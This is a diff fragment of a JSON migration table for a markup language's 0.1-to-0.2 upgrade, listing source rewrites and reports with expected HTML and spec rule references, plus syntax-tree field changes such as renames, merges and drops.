+      "meaning02": "<div class=\"z line-block\">\n  <p>verse</p>\n</div> Attribute names are written once in their canonical case under C2-H-012 and C2-H-013. HTML attribute names are not case-sensitive, so the tool compares them lowercased and the old `CLASS` output is the same attribute.",
+      "toolEntry": "U-392",
+      "silent": true
+    },
+    {
+      "id": "U-393",
+      "kind": "report",
+      "group": "inline comments",
+      "from": "{~a %% b~>c~} d\n",
+      "to": "",
+      "meaning02": "<p>{~a</p> C2-I-024 makes the line comment take the rest of its line, the substitution arrow, the closer and ` d` included; 0.1 ended the comment at the first raw closer of its frame and wrote `{~a d`. A line comment in any bracket or braced frame whose closer follows on its line changes the same way; U-399 to U-402 rewrite only their own verified sources. Report the source range from the comment marker through the end of its line.",
+      "toolEntry": "U-393",
+      "silent": true
+    },
+    {
+      "id": "U-394",
+      "kind": "report",
+      "group": "comment fence ownership",
+      "from": "> %%%\n%%\n> %%%\nz\n",
+      "to": "",
+      "meaning02": "<blockquote>\n\n</blockquote>\n<blockquote>\n\n</blockquote>\n<p>z</p> The quoted comment fence uses its live container under C2-B-108 and C2-B-032, yielding another empty quote. Report the source range from the quoted opener through its matching closer.",
+      "toolEntry": "U-394",
+      "silent": true
+    },
+    {
+      "id": "U-395",
+      "kind": "report",
+      "group": "comment fence ownership",
+      "from": "- p\n  {% a\n   %%%\n   z %}\nplain\n",
+      "to": "",
+      "meaning02": "<ul>\n  <li>p\n{% a</li>\n</ul>\n<p>plain</p> A comment-fence-shaped line inside a braced comment changes which lines the list retains under C2-B-108 and C2-I-025. Report the source range from the braced comment opener through its closing mark.",
+      "toolEntry": "U-395",
+      "silent": true
+    },
+    {
+      "id": "U-396",
+      "kind": "report",
+      "group": "rulings of 16 November",
+      "from": "a $`\n",
+      "to": "",
+      "meaning02": "<p>a $`</p> C2-I-017 reads a backtick run with no closer of its length as text, and 0.1 wrote an empty math span. An adjacent closer joins the opener into a wider run, and a separator changes the empty value, so no spelling keeps the empty span. Report the parsed math range, `$` or `$$` with its backticks, at the end of inline content; do not rewrite.",
+      "toolEntry": "U-396",
+      "silent": true
+    },
+    {
+      "id": "U-397",
+      "kind": "report",
+      "group": "ordered list style",
+      "from": "v.  x\nvi.  y\n",
+      "to": "",
+      "meaning02": "<ol type=\"a\" start=\"22\">\n  <li>x</li>\n</ol>\n<ol type=\"i\" start=\"6\">\n  <li>y</li>\n</ol> C2-B-042 fixes the first marker as alphabetic; C2-B-044 splits at `vi.`. Report the two-list boundary for review.",
+      "toolEntry": "U-397",
+      "silent": false
+    },
+    {
+      "id": "U-398",
+      "kind": "report",
+      "group": "ordered list style",
+      "from": "i.  x\nj.  y\n",
+      "to": "",
+      "meaning02": "<ol type=\"i\">\n  <li>x</li>\n</ol>\n<ol type=\"a\" start=\"10\">\n  <li>y</li>\n</ol> C2-B-042 fixes the first marker as roman; C2-B-044 splits at `j.`. Report the two-list boundary for review.",
+      "toolEntry": "U-398",
+      "silent": false
+    },
+    {
+      "id": "U-399",
+      "kind": "rewrite",
+      "group": "inline comments",
+      "from": "[a %% b](/u) c\n",
+      "to": "[a{% b %}](/u) c\n",
+      "meaning02": "<p>[a</p> C2-I-024 takes the closing bracket and link tail. The proposed braced comment restores the 0.1 link HTML.",
+      "toolEntry": "U-399",
+      "silent": true
+    },
+    {
+      "id": "U-400",
+      "kind": "rewrite",
+      "group": "inline comments",
+      "from": "^[a %% c] d\n",
+      "to": "^[a{% c %}] d\n",
+      "meaning02": "<p>^[a</p> C2-I-024 takes the closing bracket and following text. The proposed braced comment restores the 0.1 footnote HTML.",
+      "toolEntry": "U-400",
+      "silent": true
+    },
+    {
+      "id": "U-401",
+      "kind": "rewrite",
+      "group": "inline comments",
+      "from": "{_a %% b_} y\n",
+      "to": "{_a{% b %}_} y\n",
+      "meaning02": "<p>{_a</p> C2-I-024 takes the closing brace. The proposed braced comment restores the 0.1 underline HTML.",
+      "toolEntry": "U-401",
+      "silent": true
+    },
+    {
+      "id": "U-402",
+      "kind": "rewrite",
+      "group": "inline comments",
+      "from": ":foo[a %% c] d\n",
+      "to": ":foo[a{% c %}] d\n",
+      "meaning02": "<p>:foo[a</p> C2-I-024 takes the closing bracket. The proposed braced comment restores the 0.1 extension HTML.",
+      "toolEntry": "U-402",
+      "silent": true
+    },
+    {
+      "id": "U-403",
+      "kind": "report",
+      "group": "ordered list style",
+      "from": "i) one\nj) two\n",
+      "to": "",
+      "meaning02": "<ol type=\"i\" data-delim=\")\">\n  <li>one</li>\n</ol>\n<ol type=\"a\" start=\"10\" data-delim=\")\">\n  <li>two</li>\n</ol> C2-B-042 fixes `i)` as roman; C2-B-044 splits at `j)`. Report the two-list boundary for review.",
+      "toolEntry": "U-403",
+      "silent": false
+    },
+    {
+      "id": "U-404",
+      "kind": "report",
+      "group": "ordered list style",
+      "from": "v) one\nvi) two\n",
+      "to": "",
+      "meaning02": "<ol type=\"a\" start=\"22\" data-delim=\")\">\n  <li>one</li>\n</ol>\n<ol type=\"i\" start=\"6\" data-delim=\")\">\n  <li>two</li>\n</ol> C2-B-042 fixes `v)` as alphabetic; C2-B-044 splits at `vi)`. Report the two-list boundary for review.",
+      "toolEntry": "U-404",
+      "silent": false
+    },
+    {
+      "id": "U-405",
+      "kind": "rewrite",
+      "group": "inline comments",
+      "from": "[%% c] d\n",
+      "to": "[{% c %}] d\n",
+      "meaning02": "<p>[%% c] d</p> C2-I-023 keeps `%%` directly after a bracket as text; 0.1 read it as a line comment that ended before the bracket. The proposed braced comment restores the 0.1 HTML.",
+      "toolEntry": "U-405",
+      "silent": true
+    },
+    {
+      "id": "U-406",
+      "kind": "rewrite",
+      "group": "inline comments",
+      "from": "^[%% c] d\n",
+      "to": "^[{% c %}] d\n",
+      "meaning02": "<p><a id=\"fnref1\" href=\"#fn1\" role=\"doc-noteref\"><sup>1</sup></a> d</p>\n<section role=\"doc-endnotes\" aria-label=\"Footnotes\">\n  <hr>\n  <ol>\n    <li id=\"fn1\">\n      <p>%% c<a href=\"#fnref1\" role=\"doc-backlink\" aria-label=\"Back to reference\">↩</a></p>\n    </li>\n  </ol>\n</section> C2-I-023 keeps `%%` at the start of an inline footnote as text; 0.1 read it as a line comment. The proposed braced comment restores the 0.1 footnote HTML.",
+      "toolEntry": "U-406",
+      "silent": true
+    },
+    {
+      "id": "U-407",
+      "kind": "rewrite",
+      "group": "inline comments",
+      "from": ":f[%%]\n",
+      "to": ":f[{% %}]\n",
+      "meaning02": "<p><span class=\"ext-f\">%%</span></p> C2-I-023 keeps `%%` at the start of extension content as text; 0.1 read it as a line comment. The proposed braced comment restores the 0.1 extension HTML.",
+      "toolEntry": "U-407",
+      "silent": true
+    },
+    {
+      "id": "U-408",
+      "kind": "report",
+      "group": "extension respellings",
+      "from": "See [Page][].\n",
+      "to": "",
+      "meaning02": "A wiki target needs the explicit `:wiki[Page]` extension form (C2-X-057). A reference may instead be a core reference, so report and choose from its resolved target.",
+      "toolEntry": "U-408",
+      "silent": true
+    },
+    {
+      "id": "U-409",
+      "kind": "report",
+      "group": "extension respellings",
+      "from": "See [Page](#Page).\n",
+      "to": "",
+      "meaning02": "A heading target may be written as `</#Page>` or kept as `[Page](#Page)` (C2-X-057). Report only when a former heading-reference integration supplied a different label.",
+      "toolEntry": "U-409",
+      "silent": true
+    },
+    {
+      "id": "U-410",
+      "kind": "report",
+      "group": "extension respellings",
+      "from": "Visit https://example.test.\n",
+      "to": "",
+      "meaning02": "Use `<https://example.test>` for an autolink (C2-X-057); inspect punctuation and the original link target before rewriting.",
+      "toolEntry": "U-410",
+      "silent": true
+    },
+    {
+      "id": "U-411",
+      "kind": "report",
+      "group": "extension respellings",
+      "from": "See [cite doe, p. 4].\n",
+      "to": "",
+      "meaning02": "A citation uses `:cite[doe]{locator=\"p. 4\"}` and its definition belongs in a named bibliography or references directive (C2-X-058). Report because the old integration may have interpreted the locator differently.",
+      "toolEntry": "U-411",
+      "silent": true
+    },
+    {
+      "id": "U-412",
+      "kind": "rewrite",
+      "group": "tabs labels",
+      "from": ":::: tabs\n::: tab [Install]\nRun.\n:::\n::::\n",
+      "to": ":::: tabs\n::: tab \"Install\"\nRun.\n:::\n::::\n",
+      "meaning02": "The bracket label becomes the only tab label when moved to a nonempty quoted title (C2-X-040, C2-X-056); this source has no other tab label.",
+      "toolEntry": "U-412",
+      "silent": true
+    },
+    {
+      "id": "U-413",
+      "kind": "rewrite",
+      "group": "tabs labels",
+      "from": ":::: tabs\n{label=Install}\n::: tab\nRun.\n:::\n::::\n",
+      "to": ":::: tabs\n::: tab \"Install\"\nRun.\n:::\n::::\n",
+      "meaning02": "The sole `label` attribute is moved to the quoted title (C2-X-056); inspect any other attribute before applying the rewrite.",
+      "toolEntry": "U-413",
+      "silent": true
+    },
+    {
+      "id": "U-414",
+      "kind": "report",
+      "group": "tabs labels",
+      "from": ":::: tabs\n::: tab\n# Install\nRun.\n:::\n::::\n",
+      "to": "",
+      "meaning02": "A first heading is content, not a tab label (C2-X-056). Report because changing it to a title would also change the body.",
+      "toolEntry": "U-414",
+      "silent": true
+    },
+    {
+      "id": "U-415",
+      "kind": "report",
+      "group": "tabs labels",
+      "from": ":::: tabs\n{.install}\n::: tab\nRun.\n:::\n::::\n",
+      "to": "",
+      "meaning02": "A class alone supplies no quoted title (C2-X-056). Report to choose a title without guessing from the class.",
+      "toolEntry": "U-415",
+      "silent": true
+    },
+    {
+      "id": "U-416",
+      "kind": "none",
+      "group": "tabs modes",
+      "from": ":::: tabs\n::: tab \"Install\"\nRun.\n:::\n::::\n",
+      "to": ":::: tabs\n::: tab \"Install\"\nRun.\n:::\n::::\n",
+      "meaning02": "<div class=\"tabs\" role=\"tablist\" aria-label=\"Tabs\"><button type=\"button\" role=\"tab\" id=\"tabs-1-0\" aria-selected=\"true\" aria-controls=\"tabs-1-0-panel\">Install</button>… The 0.1 host setting `mode: 'aria'` maps onto the option `mode: 'aria'` of the 0.2 tabs renderer (C2-X-043, C2-X-056), which writes the same WAI-ARIA tab pattern and leaves the switching script to the host. The ids are `tabs-N-K` and `tabs-N-K-panel` (C2-X-048), not `tabset-N-tab-K` and `tabset-N-panel-K`, and a tab id does not supply them; the buttons carry no class, the panels the class `tab-panel`, and no line break separates the elements. No source edit; set the option and check host scripts and styles that select the 0.1 ids or classes.",
+      "toolEntry": "U-416",
+      "silent": true
+    },
+    {
+      "id": "U-417",
+      "kind": "report",
+      "group": "tabs modes",
+      "from": "{.custom-tabs}\n:::: tabs\n::: tab \"Install\"\nRun.\n:::\n::::\n",
+      "to": "",
+      "meaning02": "A per-instance host class is not a standard tabs mode (C2-X-056). Report so the host can place its styling outside the standard renderer.",
+      "toolEntry": "U-417",
+      "silent": true
+    },
+    {
+      "id": "U-418",
+      "kind": "none",
+      "group": "tabs selection",
+      "from": ":::: tabs\n::: tab \"A\"\na\n:::\n\n{selected}\n::: tab \"B\"\nb\n:::\n::::\n",
+      "to": ":::: tabs\n::: tab \"A\"\na\n:::\n\n{selected}\n::: tab \"B\"\nb\n:::\n::::\n",
+      "meaning02": "<div class=\"tabs\" role=\"group\" aria-label=\"Tabs\"><input type=\"radio\" name=\"tabs-1\" id=\"tabs-1-0\"><label for=\"tabs-1-0\">A</label><input type=\"radio\" name=\"tabs-1\" id=\"tabs-1-1\" checked><label for=\"tabs-1-1\">B</label>… C2-X-056 keeps `selected`: the first marked tab is the initially selected tab and with no mark the first tab is, as in 0.1. No source edit is needed; the renderer markup around it is a host matter (U-416, U-419).",
+      "toolEntry": "U-418",
+      "silent": false
+    },
+    {
+      "id": "U-419",
+      "kind": "report",
+      "group": "tabs modes",
+      "from": ":::: tabs\n::: tab \"Install\"\nRun.\n:::\n::::\n",
+      "to": "",
+      "meaning02": "<div class=\"tabs\" role=\"group\" aria-label=\"Tabs\"><section class=\"tabs-panel\"><h3 class=\"tabs-label\">Install</h3><p>Run.</p></section></div> Static mode keeps the 0.1 static elements and classes (C2-X-043) but writes no line breaks between them and no 0.1 roundtrip carrier attributes, and the heading holds the title with its inline markup. Report so a host that processes static HTML can check it.",
+      "toolEntry": "U-419",
+      "silent": true
+    },
+    {
+      "id": "U-420",
+      "kind": "none",
+      "group": "host options",
+      "from": "(0.1 PHP render option softBreakMode)",
+      "to": "(render option softBreak)",
+      "meaning02": "A soft break is a line break unless `softBreak` is `space`, one space, or `br`, `<br>` and a line break (C2-H-203). The 0.1 values `Newline`, `Space` and `Break` are `newline`, `space` and `br`.",
+      "toolEntry": "U-420",
+      "silent": false
+    },
+    {
+      "id": "U-421",
+      "kind": "none",
+      "group": "host options",
+      "from": "(0.1 command line --allow-loss CODE)",
+      "to": "(option allowLosses)",
+      "meaning02": "`--allow-loss` stays and sets `allowLosses`, which the render and the HTML importer read: an allowed code is left out of the record and never fails `strictLosses` (C2-H-204, C2-T-027).",
+      "toolEntry": "U-421",
+      "silent": false
+    },
+    {
+      "id": "U-422",
+      "kind": "none",
+      "group": "host options",
+      "from": "(0.1 maxRenderLosses and --max-render-losses)",
+      "to": "(option maxLosses)",
+      "meaning02": "`--max-render-losses` stays and sets `maxLosses`, default 100 as in 0.1: the record keeps the first losses and counts the others in `suppressedDiagnostics` (C2-H-205, C2-T-029).",
+      "toolEntry": "U-422",
+      "silent": false
+    },
+    {
+      "id": "U-423",
+      "kind": "rewrite",
+      "group": "extension respellings",
+      "from": "See [[Main Page]].\n",
+      "to": "See :wiki[Main Page].\n",
+      "meaning02": "The 0.1 wikilinks extension read `[[Page]]`; 0.2 adds no delimiter for an extension, and the wiki form is `:wiki[Page]` (C2-X-013, C2-X-057). Rewrite only where the 0.1 host registered wikilinks.",
+      "toolEntry": "U-423",
+      "silent": true
+    },
+    {
+      "id": "U-424",
+      "kind": "rewrite",
+      "group": "extension respellings",
+      "from": "See [[Main Page|home]].\n",
+      "to": "See :wiki[Main Page|home].\n",
+      "meaning02": "The display text after the first `|` stays the display text and the fallback (C2-X-057). Rewrite only where the 0.1 host registered wikilinks.",
+      "toolEntry": "U-424",
+      "silent": true
+    },
+    {
+      "id": "U-425",
+      "kind": "rewrite",
+      "group": "extension respellings",
+      "from": "Type :samp[ls -l].\n",
+      "to": "Type [ls -l]{samp}.\n",
+      "meaning02": "Sample output is a span with the key `samp`, which a registered semantic span extension writes as `<samp>`; the key is an ordinary attribute of the core (C2-X-066). Rewrite only where the 0.1 host registered the `samp` extension.",
+      "toolEntry": "U-425",
+      "silent": true
+    },
+    {
+      "id": "U-426",
+      "kind": "report",
+      "group": "inline comments",
+      "from": "[%% hidden](/u)\n",
+      "to": "",
+      "meaning02": "<p><a href=\"/u\">%% hidden</a></p> C2-I-023 keeps `%%` directly after the opener of a bracket, an inline note or extension content as text; 0.1 read it as a line comment that ended at the closer and wrote an empty link. U-405 to U-407 rewrite only their own verified sources. Report the source range from the `%%` through the closer of its frame.",
+      "toolEntry": "U-426",
+      "silent": true
+    },
+    {
+      "id": "U-427",
+      "kind": "rewrite",
+      "group": "tabs structure",
+      "from": "{.tabs}\n::::\n{.tab}\n::: [Install]\nRun it.\n:::\n::::\n",
+      "to": ":::: tabs\n::: tab \"Install\"\nRun it.\n:::\n::::\n",
+      "meaning02": "The 0.2 tabs extension matches the div names `tabs` and `tab`, not the classes (C2-X-039, C2-X-040), so a class-form group or tab stays a core div. Write the class as the div name; the label moves to the quoted title as in U-412. A class beside `tabs` or `tab` stays in the attribute block.",
+      "toolEntry": "U-427",
+      "silent": true
+    },
+    {
+      "id": "U-428",
+      "kind": "report",
+      "group": "tabs structure",
+      "from": ":::: tabs\n::: tab \"A\"\na\n:::\n\nstray\n::::\n",
+      "to": "",
+      "meaning02": "0.1 left a block that is not a tab out of the tabs output; 0.2 claims a group only when every block in it is a tab (C2-X-040), so the whole group stays a core div and its default render does not change. Report the block: moving it out of the group or into a tab changes the document.",
+      "toolEntry": "U-428",
+      "silent": true
+    },
+    {
+      "id": "U-429",
+      "kind": "rewrite",
+      "group": "case-only references",
+      "from": "# Intro\n\nSee </#intro>.\n",
+      "to": "# Intro\n\nSee </#Intro>.\n",
+      "meaning02": "Under `carve upgrade --migrate`, a cross-reference or reference label that misses its only target by case alone is respelled to that target before the upgrade reads the source, the `fmt --migrate` repair of 0.1. An id is matched exactly, without case folding (C2-I-097). A reference with several candidates is left for `lint`.",
+      "toolEntry": "U-429",
+      "silent": true
+    },
+    {
+      "id": "U-430",
+      "kind": "escape",
+      "group": "upgrade replay",
+      "from": "a /b {+c/ d+}\n",
+      "to": "a \\/b {+c/ d+}\n",
+      "meaning02": "<p>a <em>b {+c</em> d+}</p> 0.2 pairs a bare delimiter wherever it can open and close (C2-I-046 to C2-I-051), across a braced opener or an attribute block, where 0.1 kept it text. A backslash keeps it text (C2-I-010). The tool escapes one or two delimiters on the line of the difference and keeps the escape only when the complete 0.1 and 0.2 HTML compare equal.",
+      "toolEntry": "U-430",
+      "silent": true
+    },
+    {
+      "id": "U-431",
+      "kind": "rewrite",
+      "group": "upgrade replay",
+      "from": "a ----------- b\n",
+      "to": "a ———– b\n",
+      "meaning02": "<p>a —–––– b</p> C2-I-111 writes an odd hyphen run that is no multiple of three as one em dash and splits the rest again; 0.1 wrote as many em dashes as leave an even rest. The dash characters 0.1 wrote keep its HTML; the tool writes them only when the complete HTML compares equal.",
+      "toolEntry": "U-431",
+      "silent": true
+    },
+    {
+      "id": "U-432",
+      "kind": "rewrite",
+      "group": "upgrade replay",
+      "from": "/*a %% b*/ y\n",
+      "to": "*/a{% b%}/* y\n",
+      "meaning02": "<p>/*a</p> A line comment takes the rest of its line, every closer on it included (C2-I-024), and starts only at a line start or after whitespace (C2-I-023); 0.1 ended it at the closer of an open span and also read it directly after an opener. A braced comment in its place (C2-I-025) keeps the 0.1 HTML, with the spaces before it removed as 0.1 removed them. The tool writes it only when the complete 0.1 and 0.2 HTML compare equal; U-399 to U-402 name the frame where it stands in one.",
+      "toolEntry": "U-432",
+      "silent": true
+    },
+    {
+      "id": "U-433",
+      "kind": "rewrite",
+      "group": "upgrade replay",
+      "from": ":: t\n %% c\n   more\n",
+      "to": ":: t\n\n %% c\n   more\n",
+      "meaning02": "<dl>\n  <dt>t\nmore</dt>\n</dl> 0.2 skips a comment-only line (C2-B-137), so the line under it continues the paragraph or term above; 0.1 ended that block at the comment line. A blank line above the comment line keeps the 0.1 blocks. The tool writes it only when the complete 0.1 and 0.2 HTML compare equal; U-379 reports the rest.",
+      "toolEntry": "U-433",
+      "silent": true
+    },
+    {
+      "id": "U-434",
+      "kind": "rewrite",
+      "group": "upgrade replay",
+      "from": "-   [ ] a\n",
+      "to": "- [ ] a\n",
+      "meaning02": "<ul>\n  <li>[ ] a</li>\n</ul> C2-B-046 reads a task box only directly after the one space a bullet requires; 0.1 also read it after more spaces. One space keeps the box. The tool writes it only when the complete 0.1 and 0.2 HTML compare equal; U-163 reports the shapes it does not verify.",
+      "toolEntry": "U-434",
+      "silent": true
+    },
+    {
+      "id": "U-435",
+      "kind": "rewrite",
+      "group": "upgrade replay",
+      "from": "[^n]: a\n\n   :: t\n   :  d\n    > q\n\nsee[^n]\n",
+      "to": "[^n]: a\n\n   :: t\n   :  d\n\n   > q\n\nsee[^n]\n",
+      "meaning02": "<p>see<a id=\"fnref1\" href=\"#fn1\" role=\"doc-noteref\"><sup>1</sup></a></p>\n<section role=\"doc-endnotes\" aria-label=\"Footnotes\">\n  <hr>\n  <ol>\n    <li id=\"fn1\">\n      <p>a</p>\n      <dl>\n        <dt>t</dt>\n        <dd>d\n&gt; q</dd>\n      </dl>\n      <p><a href=\"#fnref1\" role=\"doc-backlink\" aria-label=\"Back to reference\">↩</a></p>\n    </li>\n  </ol>\n</section> C2-B-076 keeps a block indented past a description mark in the description; 0.1 ended the description where the block stood left of the description content. The block moves to the column of the list that holds it (C2-B-067), so it stays after the description list, in a note body or a list item too. U-199 and U-236 cover the same move for their own shapes. The tool writes it only when the complete 0.1 and 0.2 HTML compare equal.",
+      "toolEntry": "U-435",
+      "silent": true
+    },
+    {
+      "id": "U-436",
+      "kind": "rewrite",
+      "group": "upgrade replay",
+      "from": "- +\n  %% c\nafter\n",
+      "to": "- %% c\n  after\n",
+      "meaning02": "<ul>\n  <li>+\nafter</li>\n</ul> With U-017 the comment moves to the marker line. Only an open paragraph takes lazy lines (C2-B-012), so a line that 0.1 read into the item left of the item column then starts a paragraph after the list. Indented to the item column it stays in the item (C2-B-025). The tool writes it only when the complete 0.1 and 0.2 HTML compare equal.",
+      "toolEntry": "U-436",
+      "silent": true
+    },
+    {
+      "id": "U-437",
+      "kind": "rewrite",
+      "group": "upgrade replay",
+      "from": "> a\n+\n- b\n> c\n",
+      "to": "> a\n>\n> - b\n>\n> c\n",
+      "meaning02": "<blockquote><p>a\n+\n- b\nc</p></blockquote> With U-016 the item takes the quote mark, and a quote line that 0.1 read as a new paragraph below the item text is then a lazy line of the item (C2-B-012, C2-B-024). A blank line with the shared quote marks keeps the 0.1 blocks. The tool writes it only when the complete 0.1 and 0.2 HTML compare equal.",
+      "toolEntry": "U-437",
+      "silent": true
+    },
+    {
+      "id": "U-438",
+      "kind": "rewrite",
+      "group": "upgrade replay",
+      "from": "   1. inner\n1. outer\nlazy\n   2. sibling\n",
+      "to": "   1. inner\n1. outer\nlazy\n\n   2. sibling\n",
+      "meaning02": "<ol>\n  <li>inner</li>\n  <li>outer\nlazy\n2. sibling</li>\n</ol> C2-B-015 reads a nested ordered marker whose first value is not 1 as a lazy text line below an open item paragraph. A blank line before the marker closes that paragraph, so the nested list retains its 0.1 value and HTML. The tool writes this only after comparing the complete HTML.",
+      "toolEntry": "U-438",
+      "silent": true
+    },
+    {
+      "id": "U-439",
+      "kind": "report",
+      "group": "upgrade replay",
+      "from": "a `\n",
+      "to": "",
+      "meaning02": "<p>a `</p> C2-I-017 reads a backtick run with no closer of its length as text, and so is a `!` or `$` glued before it. 0.1 wrote an empty code span for an empty code value; an adjacent closer joins the opener into a wider run, and a separator changes the empty value. A code, literal-text or math value that starts with a space and a backtick, or ends with a backtick and a space, has no spelling either, since C2-I-016 removes that space (C2-W-077). An empty literal-text run that U-440 cannot remove is reported too: 0.1 wrote nothing for it, and the space before it, which 0.2 drops at the end of the content (C2-I-002), or the empty paragraph or heading it filled has no spelling. Report the parsed range of the run and its value; do not rewrite.",
+      "toolEntry": "U-439",
+      "silent": true
+    },
+    {
+      "id": "U-440",
+      "kind": "rewrite",
+      "group": "upgrade replay",
+      "from": "x!``\n",
+      "to": "x\n",
+      "meaning02": "<p>x!``</p> C2-I-017 reads a backtick run with no closer of its length as text, and so is a `!` glued before it; 0.1 wrote nothing for an empty literal-text run at the end of the content. Removing the run keeps <p>x</p>. The tool writes it only when the complete 0.1 and 0.2 HTML compare equal; otherwise U-439 reports the run.",
+      "toolEntry": "U-440",
+      "silent": true
+    },
+    {
+      "id": "U-441",
+      "kind": "rewrite",
+      "group": "rulings of 24 November",
+      "from": "a ` x ` b\n",
+      "to": "a `x` b\n",
+      "meaning02": "<p>a <code> x </code> b</p> C2-I-016 keeps the spaces at the ends of a code span and removes only a space between a backtick and the opening or closing run; 0.1 removed one space from each end when both ends held one. Writing the 0.1 value as C2-W-077 spells it keeps <p>a <code>x</code> b</p>. This holds for a literal-text, math or raw inline span too. A 0.1 value that starts with a space and a backtick or ends with a backtick and a space has no 0.2 spelling (C2-W-077): report the span; do not rewrite. `code-span-padding-kept` reports the span under the lint option `upgrade` (C2-W-156).",
+      "toolEntry": "U-441",
+      "silent": true
+    },
+    {
+      "id": "U-442",
+      "kind": "rewrite",
+      "group": "rulings of 24 November",
+      "from": "![a](a.png)\n^ cap one\ncontinued\n",
+      "to": "![a](a.png)\n^ cap one\n  continued\n",
+      "meaning02": "<figure>\n  <img src=\"a.png\" alt=\"a\">\n  <figcaption>cap one</figcaption>\n</figure>\n<p>continued</p> A caption is a label (C2-B-148, C2-B-234): it holds only the lines directly below it that are indented past its caret. 0.1 joined an unindented line to a caption. Write each line 0.1 joined to a caption at the column of the caption text, behind the caret and its space (C2-W-024). This holds for the caption of an image, a table, a code block, a quote and a figure group, in every container. The tool writes it only when the complete 0.1 and 0.2 HTML compare equal; a line that ends the caption even when indented, such as a fence line, a table row or a thematic break, is not rewritten. A description mark 0.1 read below a term, indented past the term mark, is U-180.",
+      "toolEntry": "U-442",
+      "silent": true
+    },
+    {
+      "id": "U-443",
+      "kind": "rewrite",
+      "group": "rulings of 24 November",
+      "from": "*[A]: B\n  x\n",
+      "to": "*[A]: B\n\n  x\n",
+      "meaning02": "<p>x</p> An abbreviation definition continues on every text line directly below it that is indented past column 0, and each such line joins its expansion (C2-B-084); 0.1 ended the definition at its line and read the indented lines as a paragraph. Write a blank line between the definition and the first line 0.2 would join to it, so the lines stay the paragraph 0.1 read. A line that ends the definition even when indented, such as a fence line, a table row, a thematic break, a region marker line or a comment line, is not rewritten. The tool writes it only when the complete 0.1 and 0.2 HTML compare equal.",
+      "toolEntry": "U-443",
+      "silent": true
+    }
+  ],
+  "tree": [
+    {
+      "id": "T-001",
+      "kind": "split",
+      "from": "`critic_substitution` with `old` and `new`",
+      "to": "a `delete` holding `old`, directly followed by an `insert` holding `new`",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-002",
+      "kind": "merge",
+      "from": "`escaped_text`",
+      "to": "`text` with the same `value`, then coalesced with its neighbors",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-003",
+      "kind": "merge",
+      "from": "`cell_wrap`",
+      "to": "a `text` node holding one space, then coalesced",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-004",
+      "kind": "drop",
+      "from": "`cellWraps` on `code`, `math` and `raw_inline`",
+      "to": "dropped",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-005",
+      "kind": "move",
+      "from": "`rawRef`",
+      "to": "dropped; 0.1 references become `collapsed` when `rawRef` ends in `[]` and `full` otherwise; 0.1 has no `shortcut` form; `key` is folded",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-006",
+      "kind": "merge",
+      "from": "`key` on definitions and footnote references",
+      "to": "folded",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-007",
+      "kind": "merge",
+      "from": "`attrs.order` and the `keyValues` object",
+      "to": "`keyValues` becomes a list of pairs, in the order `attrs.order` gives or else in member order; `order` is dropped; a key named `id` or `class` folds in",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-008",
+      "kind": "move",
+      "from": "an `image` in a list of blocks",
+      "to": "a `paragraph` with `role: \"image\"` that holds the image",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-009",
+      "kind": "split",
+      "from": "a `line_block` with block children",
+      "to": "`line` children, split at the breaks of each paragraph, with an empty `line` between stanzas; `lines` is dropped",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-010",
+      "kind": "move",
+      "from": "a heading id in `attrs.id`",
+      "to": "kept as an authored id: the draft tree does not say which ids were generated",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-011",
+      "kind": "move",
+      "from": "`marker.bare`, `block_quote.fenced`, `table.sourceFormat`",
+      "to": "dropped from the tree; written to a source-layout sidecar when the caller asks for one and supplies the original source, and otherwise dropped",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-012",
+      "kind": "drop",
+      "from": "`definition_list.spacing`",
+      "to": "dropped",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-013",
+      "kind": "drop",
+      "from": "the former image promotion stage",
+      "to": "dropped; `role: \"image\"` stays as the tree has it",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-014",
+      "kind": "drop",
+      "from": "the task status `cancelled`, in a draft tree or a 1.2 tree",
+      "to": "removed; status derives from the mark",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-015",
+      "kind": "rename",
+      "from": "the former reference spelling field on links and images",
+      "to": "`refForm`; the name identifies reference spelling rather than xref display.",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-016",
+      "kind": "rename",
+      "from": "the former cross-reference display field",
+      "to": "`display`; the name identifies generated display text rather than reference spelling.",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-017",
+      "kind": "rename",
+      "from": "the former string tooltip field on link reference definitions",
+      "to": "`tooltip`; all link target strings use one name, while visible titles stay inline lists.",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-018",
+      "kind": "merge",
+      "from": "the former image and math promotion flags on paragraphs",
+      "to": "`role: \"image\"` and `role: \"math\"`; one field makes the two exclusive.",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-019",
+      "kind": "rename",
+      "from": "the former camel-case ruby pair node type",
+      "to": "`ruby_pair`; the type follows snake_case and carries common node fields.",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-020",
+      "kind": "rename",
+      "from": "the former citation author-suppression flag",
+      "to": "`citation.mode: \"suppress-author\"`; one field determines the mode.",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-021",
+      "kind": "drop",
+      "from": "`citation_group.mode`",
+      "to": "removed; every item carries its own mode.",
+      "migrationRule": "C2-A-178",
+      "silent": false
+    },
+    {
+      "id": "T-022",
+      "kind": "merge",
+      "from": "`citation.locatorLabel` and `citation.locatorValue`",
+      "to": "`locator` object with label and inline children; its parts cannot disagree.",
+      "migrationRule": "C2-A-178",
+      "silent": false
